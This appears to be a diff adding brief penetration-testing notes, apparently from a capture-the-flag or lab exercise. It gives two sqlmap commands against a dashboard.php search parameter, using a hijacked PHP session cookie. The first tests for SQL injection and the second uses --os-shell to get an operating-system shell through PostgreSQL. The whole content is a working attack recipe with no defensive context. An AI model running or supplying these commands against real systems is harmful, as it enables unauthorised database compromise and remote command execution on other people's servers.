@@ -1,0 +1,5 @@
+## Test sqlmap with cookies
+sqlmap -u 'http://[IP]/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls"
+
+## Ingect shell in postgresql
+sqlmap -u 'http://[IP]/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls" --os-shell
